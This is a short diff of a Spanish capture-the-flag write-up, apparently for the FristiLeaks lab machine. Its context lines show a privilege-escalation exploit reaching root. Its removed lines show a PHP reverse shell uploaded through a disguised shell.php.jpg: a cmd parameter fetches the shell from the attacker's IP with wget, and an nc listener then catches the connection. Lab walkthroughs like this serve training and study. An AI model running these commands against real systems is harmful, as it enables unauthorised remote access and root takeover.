@@ -34,10 +34,3 @@ El archivo exploit.c viene con algunas líneas de nc, así que las contamos (hay
   ./exploit
   id
     uid=0(root) gid=0(wheel) groups=0(wheel)
-
-cp /usr/share/webshells/php/php-reverse-shell.php ./
-Ponemos nuestra IP y puerto
-http://192.168.111.135/fristi/uploads/shell.php.jpg?cmd=wget%20192.168.111.128/php-reverse-shell.php
-nc -nlvp 2222
-192.168.111.135/fristi/uploads/php-reverse-shell.php
-Y tenemos shell
